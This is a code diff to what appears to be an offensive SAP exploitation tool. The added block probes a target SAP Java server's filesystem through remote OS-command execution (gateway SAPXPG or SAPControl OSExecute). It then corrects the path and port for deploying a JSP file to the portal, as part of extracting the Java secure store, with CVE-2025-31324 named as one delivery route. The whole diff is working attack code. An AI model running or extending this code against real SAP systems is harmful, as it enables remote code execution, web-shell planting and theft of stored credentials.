@@ -180,6 +180,62 @@ def extract_java_secstore(node: SAPNode, state: SAPMAPState) -> dict:
     target_path = _java_jsp_target_path(node, java_inst, jsp_name)
     jsp_url = (f"{jsp_scheme}://{node.ip or node.hostname}"
                f":{http_port}/irj/{jsp_name}")
+
+    # When we're about to deploy via the GW / SAPControl chunked-echo
+    # channel, the SAPControl pivot instance number (5NN13/14 = SCS)
+    # frequently differs from the actual Java Central Instance's NN.
+    # Operator-reported for THJ (J01 miss / J00 hit), SJJ (J03 miss /
+    # J02 hit) and SJ1 (J03 miss / J02 hit): burning 100+ chunks
+    # into a nonexistent path, then discovering PATH_NOT_FOUND at
+    # openssl / certutil decode time.  Probe the filesystem NOW so
+    # both `target_path` and the JSP URL port target the correct NN.
+    use_gw_or_sc = (not (node.cve_2025_31324_vulnerable)) and \
+                    ((node.gw_vulnerable) or bool(
+                        getattr(node, "_cached_sapcontrol_pivot", None)))
+    if use_gw_or_sc:
+        try:
+            from sap_ume_user_create import probe_java_root_dir
+            from sapmap_exploit import execute_os_command, _java_os_type
+            _linux = (_java_os_type(node) == "linux")
+            _sc = getattr(node, "_cached_sapcontrol_pivot", None) or {}
+            _hint = (_sc.get("os_hint") or "").lower()
+            if _hint == "unix":
+                _linux = True
+            elif _hint == "windows":
+                _linux = False
+
+            def _sec_exec(program, params):
+                return execute_os_command(node, program, params)
+
+            probed_root, probed_inst = probe_java_root_dir(
+                node.sid, _linux, _sec_exec, java_inst)
+            if probed_root:
+                if probed_inst is not None and probed_inst != java_inst:
+                    print(f"[+] {node.sid}: probed Java root — Java "
+                          f"instance J{probed_inst:02d} differs from "
+                          f"SAPControl-derived J{java_inst:02d} — "
+                          f"correcting target path AND JSP URL port")
+                    java_inst = probed_inst
+                    # 5NN00 (HTTP) / 5NN01 (HTTPS) for the real Java NN.
+                    new_http = 50000 + probed_inst * 100 + (
+                        1 if jsp_scheme == "https" else 0)
+                    http_port = new_http
+                target_path = probed_root + (
+                    ("/" if _linux else "\\") + jsp_name)
+                jsp_url = (f"{jsp_scheme}://"
+                           f"{node.ip or node.hostname}"
+                           f":{http_port}/irj/{jsp_name}")
+                print(f"[+] {node.sid}: probed Java root — using "
+                      f"{probed_root}")
+            else:
+                print(f"[!] {node.sid}: could not enumerate a "
+                      f"servlet_jsp/irj/root under J/JC/JD instances "
+                      f"— falling back to J{java_inst:02d} guess "
+                      f"(deploy may fail at decode with PATH_NOT_FOUND)")
+        except Exception as _e:
+            print(f"[!] {node.sid}: Java-root probe raised {_e!r} — "
+                  f"proceeding with J{java_inst:02d} guess")
+
     delivery = ("CVE-2025-31324" if use_cve
                 else "GW SAPXPG"  if use_gw
                 else "SAPControl OSExecute" if use_sapcontrol
